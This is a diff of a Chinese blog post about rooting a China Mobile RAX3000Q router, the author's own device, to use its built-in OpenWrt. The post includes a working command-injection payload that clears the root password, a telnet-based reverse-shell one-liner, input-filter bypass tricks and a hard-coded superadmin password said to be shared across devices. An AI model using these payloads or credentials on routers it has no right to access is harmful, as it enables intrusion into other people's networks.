@@ -1,224 +1,56 @@
-<!doctype html><html lang=zh-cn>
-<head>
-<meta charset=utf-8>
-<meta name=viewport content="width=device-width,initial-scale=1">
-<title>中移RAX3000Q路由器解锁telnet/ssh及使用内置的OpenWrt | imlk's blog</title>
-<link rel=stylesheet href=/css/style.css>
-<link rel=stylesheet href=/css/fonts.css>
-<link rel=preconnect href=https://fonts.googleapis.com>
-<link rel=preconnect href=https://fonts.gstatic.com crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@400;700&display=swap" rel=stylesheet>
-</head>
-<body>
-<header class=header>
-<a class=logo href=/> imlk's Blog </a>
-<nav>
-<ul class=menu>
-<li><a href=/>Home</a></li>
-<li><a href=/about/>About</a></li>
-<li><a href=/archives/>Archives</a></li>
-<li><a href=/friends/>Friends</a></li>
-<li><a href=/index.xml>Subscribe</a></li>
-</ul>
-</nav>
-</header>
-<hr>
-<div class=article-meta>
-<h1><span class=title>中移RAX3000Q路由器解锁telnet/ssh及使用内置的OpenWrt</span></h1>
-<span>
-<span class=date>2022-01-29</span>
+<!doctype html><html lang=zh-cn><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>中移RAX3000Q路由器解锁telnet/ssh及使用内置的OpenWrt | imlk's blog</title><link rel=stylesheet href=/css/style.css><link rel=stylesheet href=/css/fonts.css><link rel=preconnect href=https://fonts.googleapis.com><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@400;700&display=swap" rel=stylesheet></head><body><header class=header><a class=logo href=/>imlk's Blog</a><nav><ul class=menu><li><a href=/>Home</a></li><li><a href=/about/>About</a></li><li><a href=/archives/>Archives</a></li><li><a href=/friends/>Friends</a></li><li><a href=/index.xml>Subscribe</a></li></ul></nav></header><hr><div class=article-meta><h1><span class=title>中移RAX3000Q路由器解锁telnet/ssh及使用内置的OpenWrt</span></h1><span><span class=date>2022-01-29</span>
 |
-<span class=cats>
-<a href=https://blog.imlk.top/categories/router/>Router</a>
-</span>
+<span class=cats><a href=https://blog.imlk.top/categories/router/>Router</a></span>
 |
-<span class=tags>
-<a href=https://blog.imlk.top/tags/%E8%B7%AF%E7%94%B1%E5%99%A8/>#路由器</a>
-<a href=https://blog.imlk.top/tags/openwrt/>#OpenWrt</a>
-</span>
-</span>
-<br>
-</div>
-<main>
-<blockquote>
-<p>注意：作者撰写本文时，基于软件版本V1.0.0、硬件版本TZ7.823.346A的中国移动RAX3000Q路由器，随着版本更新其中的方法可能失效。</p>
-</blockquote>
-<h1 id=tldr>TL;DR</h1>
-<p>对于不想阅读探索过程的读者，可以通过以下两个步骤快速开启telnet</p>
-<ul>
-<li>
-<p>删除root密码：</p>
-<ul>
-<li>
-<p>在web面板「诊断 - ping」页面的ip地址输入框填入以下内容后点击开始：</p>
-<pre tabindex=0><code>$(passwd${IFS}-d${IFS}root)
-</code></pre><p>此时root用户的密码已经清除。可以在<code>http://&lt;路由器ip>:8080/</code>处的LuCI直接以root身份无密码登陆</p>
-</li>
-</ul>
-</li>
-<li>
-<p>开启telnet/ssh：只介绍稳定telnet的开启方法，自带的ssh服务有点麻烦暂时不管自己折腾（都有luCI了，方法肯定多的去了）。</p>
-<ul>
-<li>回到web面板，以帐号<code>superadmin</code>，密码<code>83583000</code>登陆，在「管理 - 系统设置」页面可开启telnet。</li>
-<li>注意开启的<strong>telnet监听端口为4719</strong>，使用<code>telnet 192.168.10.1 4719</code>连接，root账户登陆，无需密码</li>
-</ul>
-</li>
-</ul>
-<h1 id=起源>起源</h1>
-<p>家里的新3路由器已服役2年，一直停留在WiFi5，但手机和电脑却已经是WiFi6甚至WiFi6E，且隔一堵墙后的网络已经无法跑满我的300M家宽，遂萌生了换路由器的想法。</p>
-<p>这次更换的是中国移动的RAX3000Q，采用<a href=https://www.qualcomm.com/products/immersive-home-216-platform>IPQ5018</a>，支持160MHz的WiFi6，与红米AX3000几乎相同的硬件配置（见：<a href=https://www.right.com.cn/forum/thread-4017133-1-1.html>恩山无线-120多款wifi6机型详细配置</a>），但是价格相对实惠且能组mesh（虽然我家也确实没组mesh的需求，但anyway，就当是增援未来了hhh）。我是在「电脑吧测评室」看到的<del>这件垃圾</del>这台路由器，与之一同推荐的还有H3C的RC3000/RT3000，后者在acwifi的站长测评后价格疯涨到了220元（<del>都涨到220元了还能叫捡垃圾吗？？</del>），而我选择的RAX3000Q具有和它非常相似的配置，但是价格更低，淘宝150拿下了（本来130的，js涨价啦）。</p>
-<h1 id=探索>探索</h1>
-<p>这台路由器的web面板相对简单，操作简洁，我很快就将其配置成了AP，与原先的新3路由桥接后，家里的无线网升级成了WiFi6。但怎么能止步于此呢？</p>
-<h2 id=简单的尝试>简单的尝试</h2>
-<p>接着尝试使用nmap扫描端口，发现8080端口上竟赫然跑着一个LuCI：</p>
-<pre tabindex=0><code>PORT     STATE SERVICE    VERSION
+<span class=tags><a href=https://blog.imlk.top/tags/%E8%B7%AF%E7%94%B1%E5%99%A8/>#路由器</a>
+<a href=https://blog.imlk.top/tags/openwrt/>#OpenWrt</a></span></span><br></div><main><blockquote><p>注意：作者撰写本文时，基于软件版本V1.0.0、硬件版本TZ7.823.346A的中国移动RAX3000Q路由器，随着版本更新其中的方法可能失效。</p></blockquote><h1 id=tldr>TL;DR</h1><p>对于不想阅读探索过程的读者，可以通过以下两个步骤快速开启telnet</p><ul><li><p>删除root密码：</p><ul><li><p>在web面板「诊断 - ping」页面的ip地址输入框填入以下内容后点击开始：</p><pre tabindex=0><code>$(passwd${IFS}-d${IFS}root)
+</code></pre><p>此时root用户的密码已经清除。可以在<code>http://&lt;路由器ip>:8080/</code>处的LuCI直接以root身份无密码登陆</p></li></ul></li><li><p>开启telnet/ssh：只介绍稳定telnet的开启方法，自带的ssh服务有点麻烦暂时不管自己折腾（都有luCI了，方法肯定多的去了）。</p><ul><li>回到web面板，以帐号<code>superadmin</code>，密码<code>83583000</code>登陆，在「管理 - 系统设置」页面可开启telnet。</li><li>注意开启的<strong>telnet监听端口为4719</strong>，使用<code>telnet 192.168.10.1 4719</code>连接，root账户登陆，无需密码</li></ul></li></ul><h1 id=起源>起源</h1><p>家里的新3路由器已服役2年，一直停留在WiFi5，但手机和电脑却已经是WiFi6甚至WiFi6E，且隔一堵墙后的网络已经无法跑满我的300M家宽，遂萌生了换路由器的想法。</p><p>这次更换的是中国移动的RAX3000Q，采用<a href=https://www.qualcomm.com/products/immersive-home-216-platform>IPQ5018</a>，支持160MHz的WiFi6，与红米AX3000几乎相同的硬件配置（见：<a href=https://www.right.com.cn/forum/thread-4017133-1-1.html>恩山无线-120多款wifi6机型详细配置</a>），但是价格相对实惠且能组mesh（虽然我家也确实没组mesh的需求，但anyway，就当是增援未来了hhh）。我是在「电脑吧测评室」看到的<del>这件垃圾</del>这台路由器，与之一同推荐的还有H3C的RC3000/RT3000，后者在acwifi的站长测评后价格疯涨到了220元（<del>都涨到220元了还能叫捡垃圾吗？？</del>），而我选择的RAX3000Q具有和它非常相似的配置，但是价格更低，淘宝150拿下了（本来130的，js涨价啦）。</p><h1 id=探索>探索</h1><p>这台路由器的web面板相对简单，操作简洁，我很快就将其配置成了AP，与原先的新3路由桥接后，家里的无线网升级成了WiFi6。但怎么能止步于此呢？</p><h2 id=简单的尝试>简单的尝试</h2><p>接着尝试使用nmap扫描端口，发现8080端口上竟赫然跑着一个LuCI：</p><pre tabindex=0><code>PORT     STATE SERVICE    VERSION
 53/tcp   open  domain     Cloudflare public DNS
 80/tcp   open  http       mini_httpd 1.30 26Oct2018
 |_http-title: \xE4\xB8\xAD\xE5\x9B\xBD\xE7\xA7\xBB\xE5\x8A\xA8
 |_http-server-header: mini_httpd/1.30 26Oct2018
 2601/tcp open  tcpwrapped
 8080/tcp open  http       LuCI Lua http config
-|_http-title: Site doesn't have a title (text/html).
-</code></pre><p><img src=/images/image-20220129213453049.png alt=左为luci，右为中国移动的web面板></p>
-<p>进一步判断发现这路由器中确实包含一个OpenWrt实例，且从版本号分析应该是QSDK而非官方的OpenWrt。也就是说这台路由器其实是基于QSDK开发而成的。</p>
-<p>接着我开始尝试取得这台路由器的完全控制，具体来说，获得一个root的shell（通过ssh或者telnet），让它足够用来替换旧的新3路由器。</p>
-<p>在接下来的两天里，我尝试过爆破LuCI的root用户密码（别看OpenWrt版本很旧，但是LuCI却是最新版），分析80端口上的面板存在的逻辑漏洞，甚至是分析<a href=https://acme.com/software/mini_httpd/>mini_httpd</a>（这东西的最新版1.30虽然是2018年释出，但似乎一直没有人发现新的漏洞）。在与群友讨论无果后，我暂时的放弃了。</p>
-<h2 id=拿到shell>拿到shell</h2>
-<p>一个星期后的下午，摸鱼中的我再次无聊地点击着web面板，在「诊断 - ping」页面时注意到那个输入ping的目标ip的输入框，抱着试试的心态，发现了这里存在的一个shell语句注入。</p>
-<p><img src=/images/image-20220129215720075.png alt=image-20220129215720075></p>
-<p>接着，我尝试创建一个反弹shell连接到我的笔记本（192.168.123.197）上的1031端口（感谢MiaoTony佬推荐的<a href=https://www.revshells.com/>反弹shell生成工具</a>）。</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=color:#66d9ef>$(</span>TF<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>mktemp -u<span style=color:#66d9ef>)</span>;mkfifo $TF <span style=color:#f92672>&amp;&amp;</span> telnet 192.168.123.197 <span style=color:#ae81ff>1031</span> 0&lt;$TF | ash 1&gt;$TF<span style=color:#66d9ef>)</span>
-</code></pre></div><p>这里有几个要点：</p>
-<ul>
-<li>
-<p>路由器中使用的是busybox，没有bash但有ash，没有nc和python，但可以用telnet</p>
-</li>
-<li>
-<p>后端似乎过滤了<code>"</code>和`` <code>，但是没有过滤</code>$()`</p>
-</li>
-<li>
-<p>这个输入框里不允许出现空白字符，但只是前端过滤，绕过方法：</p>
-<ul>
-<li>F12改前端代码（x</li>
-<li>使用<code>${IFS}</code>替代所有空格，但是要注意输入框字符长度限制</li>
-<li>直接F12改或者在BurpSuite里修改请求里的<code>url</code>参数绕过</li>
-</ul>
-<p><img src=/images/image-20220129234054687.png alt=image-20220129234054687></p>
-</li>
-</ul>
-<h2 id=持久化>持久化</h2>
-<p>拿到反弹shell后，我们第一步可以直接使用passwd命令修改root密码，然后我们就能从8080端口的LuCI上登陆了：</p>
-<p><img src=/images/image-20220129221356976.png alt=image-20220129221356976></p>
-<p>OpenWrt中默认使用dropbear作为ssh服务器，但是因为未知的原因无法通过<code>/etc/init.d/dropbear start</code>启动。因此我选择在反弹shell中启动一个监听22端口的临时dropbear服务，然后从笔记本上ssh连上去</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>/usr/sbin/dropbear -p <span style=color:#ae81ff>22</span>
-</code></pre></div><p><img src=/images/image-20220130002802328.png alt=image-20220130002802328></p>
-<p>（草，为什么是armv7l，说好的Dual-core Cortex-A53，怎么就配了个32位OpenWrt？？？</p>
-<h2 id=继续探索>继续探索</h2>
-<h3 id=隐藏的账户>隐藏的账户</h3>
-<p>使用<code>mdlcfg -e </code>可以导出一些系统系统配置信息，其中还发现了一些有价值的东西：</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>export SYS_SUPER_LOGIN_NAME<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;superadmin&#34;</span>
-export SYS_SUPER_LOGIN_PWD<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;83583000&#34;</span>
-export SYS_SENIOR_LOGIN_NAME<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;senior&#34;</span>
-export SYS_SENIOR_LOGIN_PWD<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;123456&#34;</span>
-export SYS_USER_LOGIN_NAME<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;user&#34;</span>
-export SYS_USER_LOGIN_PWD<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;******&#34;</span>
-</code></pre></div><p>看起来web面板包括三个帐号，权限从低到高依次为<code>user</code>、<code>senior</code>、<code>superadmin</code></p>
-<ul>
-<li>user：最普通的账户，密码在机器背面</li>
-<li>senior：猜测应该是高级用户，弱密码<code>123456</code>，增加了：
-<ul>
-<li>对ANDLINK模块的控制（似乎是中国移动的一个模块）</li>
-<li>允许导出系统配置文件（文件被特别编码过，暂不知格式）</li>
-<li>远程抓包开关。开启后可以指定开启一个端口，使用wiresharp从该端口抓包</li>
-</ul>
-</li>
-<li>superadmin：最顶级的用户，密码似乎都是<code>83583000</code>（个人猜测在中国移动的路由器中是通用的，搜索引擎搜一下这个密码有惊喜），增加了：
-<ul>
-<li>可以修改web面板主题配色</li>
-<li>显示git分支名和git commit号（我这里看到的值为空）</li>
-<li>TR069功能开关和配置</li>
-<li>和苗FOTA功能开关（疑似是和固件升级有关的，我给关上了）</li>
-<li>无线网络可选WiFi国家码，可设置3个访客网络</li>
-<li>静态路由（不知道是啥）</li>
-<li>URL过滤、ACL过滤</li>
-<li><strong>telnet开关（可用，监听在4719端口）、ssh开关（但好像是坏的）</strong>、锁网开关、允许导入配置</li>
-<li>指定WAN口</li>
-<li>本地对指定interface抓包并保存到文件</li>
-</ul>
-</li>
-</ul>
-<h3 id=更换软件源不推荐>更换软件源(不推荐)</h3>
-<blockquote>
-<p>注意：不建议直接在QSDK固件上直接更新使用openwrt官方的仓库，<a href=https://blog.imlk.top/posts/rax3000q-compile-qsdk/>下一篇文章</a>介绍了怎么从QSDK源码编译能够兼容的软件包ipk文件</p>
-</blockquote>
-<p>IPQ5018是双核Cortex-A53处理器，opkg默认的架构为<code>ipq</code>，但是OpenWrt软件源里并没有这种架构，我们需要选择一个相近的架构。</p>
-<p>由于目前运行的QSDK是32位的，无法像<a href=https://xn--m80a.ml/openwrt/dev/10.html>这篇文章</a>一样直接使用<code>aarch64_cortex-a53</code>的软件源。根据cpuinfo信息判断应该是armv7l且支持vfpv4硬件浮点，但是内置的interpreter却是<code>/lib/ld-musl-arm.so.1</code>，只支持软件浮点，这个问题可以创建一个软链接来解决。</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>ln -s /lib/ld-musl-arm.so.1 /lib/ld-musl-armhf.so.1
-</code></pre></div><p>最终我选择的架构是<code>arm_cortex-a7_neon-vfpv4</code>。在<code>/etc/opkg.conf</code>中添加以下内容：</p>
-<pre tabindex=0><code>arch all 1
+|_http-title: Site doesn&#39;t have a title (text/html).
+</code></pre><p><img src=/images/image-20220129213453049.png alt=左为luci，右为中国移动的web面板></p><p>进一步判断发现这路由器中确实包含一个OpenWrt实例，且从版本号分析应该是QSDK而非官方的OpenWrt。也就是说这台路由器其实是基于QSDK开发而成的。</p><p>接着我开始尝试取得这台路由器的完全控制，具体来说，获得一个root的shell（通过ssh或者telnet），让它足够用来替换旧的新3路由器。</p><p>在接下来的两天里，我尝试过爆破LuCI的root用户密码（别看OpenWrt版本很旧，但是LuCI却是最新版），分析80端口上的面板存在的逻辑漏洞，甚至是分析<a href=https://acme.com/software/mini_httpd/>mini_httpd</a>（这东西的最新版1.30虽然是2018年释出，但似乎一直没有人发现新的漏洞）。在与群友讨论无果后，我暂时的放弃了。</p><h2 id=拿到shell>拿到shell</h2><p>一个星期后的下午，摸鱼中的我再次无聊地点击着web面板，在「诊断 - ping」页面时注意到那个输入ping的目标ip的输入框，抱着试试的心态，发现了这里存在的一个shell语句注入。</p><p><img src=/images/image-20220129215720075.png alt=image-20220129215720075></p><p>接着，我尝试创建一个反弹shell连接到我的笔记本（192.168.123.197）上的1031端口（感谢MiaoTony佬推荐的<a href=https://www.revshells.com/>反弹shell生成工具</a>）。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span><span style=color:#66d9ef>$(</span>TF<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>mktemp -u<span style=color:#66d9ef>)</span>;mkfifo $TF <span style=color:#f92672>&amp;&amp;</span> telnet 192.168.123.197 <span style=color:#ae81ff>1031</span> 0&lt;$TF | ash 1&gt;$TF<span style=color:#66d9ef>)</span>
+</span></span></code></pre></div><p>这里有几个要点：</p><ul><li><p>路由器中使用的是busybox，没有bash但有ash，没有nc和python，但可以用telnet</p></li><li><p>后端似乎过滤了<code>"</code>和`` <code>，但是没有过滤</code>$()`</p></li><li><p>这个输入框里不允许出现空白字符，但只是前端过滤，绕过方法：</p><ul><li>F12改前端代码（x</li><li>使用<code>${IFS}</code>替代所有空格，但是要注意输入框字符长度限制</li><li>直接F12改或者在BurpSuite里修改请求里的<code>url</code>参数绕过</li></ul><p><img src=/images/image-20220129234054687.png alt=image-20220129234054687></p></li></ul><h2 id=持久化>持久化</h2><p>拿到反弹shell后，我们第一步可以直接使用passwd命令修改root密码，然后我们就能从8080端口的LuCI上登陆了：</p><p><img src=/images/image-20220129221356976.png alt=image-20220129221356976></p><p>OpenWrt中默认使用dropbear作为ssh服务器，但是因为未知的原因无法通过<code>/etc/init.d/dropbear start</code>启动。因此我选择在反弹shell中启动一个监听22端口的临时dropbear服务，然后从笔记本上ssh连上去</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>/usr/sbin/dropbear -p <span style=color:#ae81ff>22</span>
+</span></span></code></pre></div><p><img src=/images/image-20220130002802328.png alt=image-20220130002802328></p><p>（草，为什么是armv7l，说好的Dual-core Cortex-A53，怎么就配了个32位OpenWrt？？？</p><h2 id=继续探索>继续探索</h2><h3 id=隐藏的账户>隐藏的账户</h3><p>使用<code>mdlcfg -e </code>可以导出一些系统系统配置信息，其中还发现了一些有价值的东西：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>export SYS_SUPER_LOGIN_NAME<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;superadmin&#34;</span>
+</span></span><span style=display:flex><span>export SYS_SUPER_LOGIN_PWD<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;83583000&#34;</span>
+</span></span><span style=display:flex><span>export SYS_SENIOR_LOGIN_NAME<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;senior&#34;</span>
+</span></span><span style=display:flex><span>export SYS_SENIOR_LOGIN_PWD<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;123456&#34;</span>
+</span></span><span style=display:flex><span>export SYS_USER_LOGIN_NAME<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;user&#34;</span>
+</span></span><span style=display:flex><span>export SYS_USER_LOGIN_PWD<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;******&#34;</span>
+</span></span></code></pre></div><p>看起来web面板包括三个帐号，权限从低到高依次为<code>user</code>、<code>senior</code>、<code>superadmin</code></p><ul><li>user：最普通的账户，密码在机器背面</li><li>senior：猜测应该是高级用户，弱密码<code>123456</code>，增加了：<ul><li>对ANDLINK模块的控制（似乎是中国移动的一个模块）</li><li>允许导出系统配置文件（文件被特别编码过，暂不知格式）</li><li>远程抓包开关。开启后可以指定开启一个端口，使用wiresharp从该端口抓包</li></ul></li><li>superadmin：最顶级的用户，密码似乎都是<code>83583000</code>（个人猜测在中国移动的路由器中是通用的，搜索引擎搜一下这个密码有惊喜），增加了：<ul><li>可以修改web面板主题配色</li><li>显示git分支名和git commit号（我这里看到的值为空）</li><li>TR069功能开关和配置</li><li>和苗FOTA功能开关（疑似是和固件升级有关的，我给关上了）</li><li>无线网络可选WiFi国家码，可设置3个访客网络</li><li>静态路由（不知道是啥）</li><li>URL过滤、ACL过滤</li><li><strong>telnet开关（可用，监听在4719端口）、ssh开关（但好像是坏的）</strong>、锁网开关、允许导入配置</li><li>指定WAN口</li><li>本地对指定interface抓包并保存到文件</li></ul></li></ul><h3 id=更换软件源不推荐>更换软件源(不推荐)</h3><blockquote><p>注意：不建议直接在QSDK固件上直接更新使用openwrt官方的仓库，<a href=https://blog.imlk.top/posts/rax3000q-compile-qsdk/>下一篇文章</a>介绍了怎么从QSDK源码编译能够兼容的软件包ipk文件</p></blockquote><p>IPQ5018是双核Cortex-A53处理器，opkg默认的架构为<code>ipq</code>，但是OpenWrt软件源里并没有这种架构，我们需要选择一个相近的架构。</p><p>由于目前运行的QSDK是32位的，无法像<a href=https://xn--m80a.ml/openwrt/dev/10.html>这篇文章</a>一样直接使用<code>aarch64_cortex-a53</code>的软件源。根据cpuinfo信息判断应该是armv7l且支持vfpv4硬件浮点，但是内置的interpreter却是<code>/lib/ld-musl-arm.so.1</code>，只支持软件浮点，这个问题可以创建一个软链接来解决。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>ln -s /lib/ld-musl-arm.so.1 /lib/ld-musl-armhf.so.1
+</span></span></code></pre></div><p>最终我选择的架构是<code>arm_cortex-a7_neon-vfpv4</code>。在<code>/etc/opkg.conf</code>中添加以下内容：</p><pre tabindex=0><code>arch all 1
 arch noarch 1
 arch ipq 10
 arch arm_cortex-a7_neon-vfpv4 20
-</code></pre><p>另一个问题是musl-libc的版本问题，内置的musl-libc版本为1.1.16且没法更新，考虑到兼容性问题（比如动态链接时找不到某些符号），选择了OpenWrt18.06版本（musl-libc版本为1.1.19）的软件源，如果还是遇问题可尝试降为OpenWrt17.01（musl-libc版本为1.1.16）。</p>
-<pre tabindex=0><code>src/gz openwrt_base http://downloads.openwrt.org/releases/packages-18.06/arm_cortex-a7_neon-vfpv4/base
+</code></pre><p>另一个问题是musl-libc的版本问题，内置的musl-libc版本为1.1.16且没法更新，考虑到兼容性问题（比如动态链接时找不到某些符号），选择了OpenWrt18.06版本（musl-libc版本为1.1.19）的软件源，如果还是遇问题可尝试降为OpenWrt17.01（musl-libc版本为1.1.16）。</p><pre tabindex=0><code>src/gz openwrt_base http://downloads.openwrt.org/releases/packages-18.06/arm_cortex-a7_neon-vfpv4/base
 src/gz openwrt_luci http://downloads.openwrt.org/releases/packages-18.06/arm_cortex-a7_neon-vfpv4/luci
 src/gz openwrt_packages http://downloads.openwrt.org/releases/packages-18.06/arm_cortex-a7_neon-vfpv4/packages
 src/gz openwrt_routing http://downloads.openwrt.org/releases/packages-18.06/arm_cortex-a7_neon-vfpv4/routing
-</code></pre><p><strong>注意QSDK基于OpenWrt15.05，可能导致一些问题，因此请谨慎更新系统自带的软件包！！！！</strong></p>
-<p>也请不要使用最新snapshots版本的软件源，因为自带的musl-libc版本较低，而<a href=https://musl.libc.org/time64.html>musl-libc中的一项改动</a>引入了不兼容的问题，导致安装的程序无法运行。</p>
-<h4 id=opkg覆盖或删除系统软件包后恢复>opkg覆盖或删除系统软件包后恢复</h4>
-<p>openwrt的根目录<code>/</code>一般挂载为overlayfs，其中<code>/rom</code>作为lowerdir，这部分不可修改。<code>/overlay/upper</code>作为upperdir，存放的是用户对根文件系统的改动内容。恢复出厂时实际上会清空<code>/overlay/upper</code>。</p>
-<p>当我们不小心删除或覆盖了自带的软件包，不需要恢复出厂设置，我们可以通过编辑<code>/overlay/upper</code>中的内容来回退。</p>
-<p>以<code>odhcpd</code>这个包为例，假设我们想恢复自带的<code>odhcpd</code>包，或者回退版本：</p>
-<ul>
-<li>
-<p>首先把新安装的版本给<code>opkg remove</code>卸载掉，然后我们「恢复」自带的版本。</p>
-</li>
-<li>
-<p>第二步从<code>/rom</code>里找出这个包所包含的文件列表，对于<code>odhcpd</code>这个包，在<code>/rom/usr/lib/opkg/info/odhcpd.list</code>中</p>
-<pre tabindex=0><code>root@imlk-rax3000q:~# cat /rom/usr/lib/opkg/info/odhcpd.list
+</code></pre><p><strong>注意QSDK基于OpenWrt15.05，可能导致一些问题，因此请谨慎更新系统自带的软件包！！！！</strong></p><p>也请不要使用最新snapshots版本的软件源，因为自带的musl-libc版本较低，而<a href=https://musl.libc.org/time64.html>musl-libc中的一项改动</a>引入了不兼容的问题，导致安装的程序无法运行。</p><h4 id=opkg覆盖或删除系统软件包后恢复>opkg覆盖或删除系统软件包后恢复</h4><p>openwrt的根目录<code>/</code>一般挂载为overlayfs，其中<code>/rom</code>作为lowerdir，这部分不可修改。<code>/overlay/upper</code>作为upperdir，存放的是用户对根文件系统的改动内容。恢复出厂时实际上会清空<code>/overlay/upper</code>。</p><p>当我们不小心删除或覆盖了自带的软件包，不需要恢复出厂设置，我们可以通过编辑<code>/overlay/upper</code>中的内容来回退。</p><p>以<code>odhcpd</code>这个包为例，假设我们想恢复自带的<code>odhcpd</code>包，或者回退版本：</p><ul><li><p>首先把新安装的版本给<code>opkg remove</code>卸载掉，然后我们「恢复」自带的版本。</p></li><li><p>第二步从<code>/rom</code>里找出这个包所包含的文件列表，对于<code>odhcpd</code>这个包，在<code>/rom/usr/lib/opkg/info/odhcpd.list</code>中</p><pre tabindex=0><code>root@imlk-rax3000q:~# cat /rom/usr/lib/opkg/info/odhcpd.list
 /usr/sbin/odhcpd
 /etc/init.d/odhcpd
 /etc/uci-defaults/odhcpd.defaults
 /usr/sbin/odhcpd-update
-</code></pre></li>
-<li>
-<p>接着在<code>/overlay/upper</code>里面将文件列表里的文件逐个删除（你会发现这些文件在<code>/overlay/upper</code>里面都表现成字符设备）。</p>
-</li>
-<li>
-<p>删除<code>/overlay/upper/usr/lib/opkg/info/</code>里面的<code>odhcpd.control</code>和<code>odhcpd.list</code>，以及<code>odhcpd.preinst</code>、<code>odhcpd.postinst</code>、<code>odhcpd.prerm</code>、<code>odhcpd.postrm</code>等总之就是<code>odhcpd</code>作为文件名然后各种不同后缀的文件</p>
-</li>
-<li>
-<p>到这一步文件已经恢复完成，接着需要修改opkg的数据库。具体来说，去<code>/rom/usr/lib/opkg/info/opkg.list</code>里面复制你要恢复软件包对应的项目，将其添加到<code>/usr/lib/opkg/info/opkg.list</code>中。</p>
-</li>
-<li>
-<p>编辑完overlayfs后，切记要进行一个remount</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>mount -oremount /
-</code></pre></div><p>此时<code>opkg</code>应该已经认出了我们恢复的软件包</p>
-<pre tabindex=0><code>root@imlk-rax3000q:~# opkg list-installed | grep odhcpd
+</code></pre></li><li><p>接着在<code>/overlay/upper</code>里面将文件列表里的文件逐个删除（你会发现这些文件在<code>/overlay/upper</code>里面都表现成字符设备）。</p></li><li><p>删除<code>/overlay/upper/usr/lib/opkg/info/</code>里面的<code>odhcpd.control</code>和<code>odhcpd.list</code>，以及<code>odhcpd.preinst</code>、<code>odhcpd.postinst</code>、<code>odhcpd.prerm</code>、<code>odhcpd.postrm</code>等总之就是<code>odhcpd</code>作为文件名然后各种不同后缀的文件</p></li><li><p>到这一步文件已经恢复完成，接着需要修改opkg的数据库。具体来说，去<code>/rom/usr/lib/opkg/info/opkg.list</code>里面复制你要恢复软件包对应的项目，将其添加到<code>/usr/lib/opkg/info/opkg.list</code>中。</p></li><li><p>编辑完overlayfs后，切记要进行一个remount</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>mount -oremount /
+</span></span></code></pre></div><p>此时<code>opkg</code>应该已经认出了我们恢复的软件包</p><pre tabindex=0><code>root@imlk-rax3000q:~# opkg list-installed | grep odhcpd
 odhcpd - 2016-10-09-801cfeea100ca7b211c9841f0fcb757b17f47860
-</code></pre></li>
-</ul>
-<h3 id=该路由器的其它信息>该路由器的其它信息</h3>
-<h4 id=uname--a>uname -a</h4>
-<pre tabindex=0><code>Linux OpenWrt 4.4.60 #1 SMP Thu Oct 21 02:26:15 CST 2021 armv7l GNU/Linux
-</code></pre><h4 id=libcso>libc.so</h4>
-<pre tabindex=0><code>musl libc (arm)
+</code></pre></li></ul><h3 id=该路由器的其它信息>该路由器的其它信息</h3><h4 id=uname--a>uname -a</h4><pre tabindex=0><code>Linux OpenWrt 4.4.60 #1 SMP Thu Oct 21 02:26:15 CST 2021 armv7l GNU/Linux
+</code></pre><h4 id=libcso>libc.so</h4><pre tabindex=0><code>musl libc (arm)
 Version 1.1.16
 Dynamic Program Loader
 Usage: /lib/libc.so [options] [--] pathname [args]
-</code></pre><h4 id=etcopenwrt_release>/etc/openwrt_release</h4>
-<pre tabindex=0><code>DISTRIB_ID='OpenWrt'
-DISTRIB_RELEASE='Chaos Calmer'
-DISTRIB_REVISION='079f770+r49254'
-DISTRIB_CODENAME='chaos_calmer'
-DISTRIB_TARGET='ipq/ipq50xx'
-DISTRIB_DESCRIPTION='OpenWrt Chaos Calmer 15.05.1'
-DISTRIB_TAINTS='no-all busybox override'
-</code></pre><h4 id=etcopenwrt_version>/etc/openwrt_version</h4>
-<pre tabindex=0><code>15.05.1
-</code></pre><h4 id=cpuinfo>cpuinfo</h4>
-<pre tabindex=0><code>processor       : 0
+</code></pre><h4 id=etcopenwrt_release>/etc/openwrt_release</h4><pre tabindex=0><code>DISTRIB_ID=&#39;OpenWrt&#39;
+DISTRIB_RELEASE=&#39;Chaos Calmer&#39;
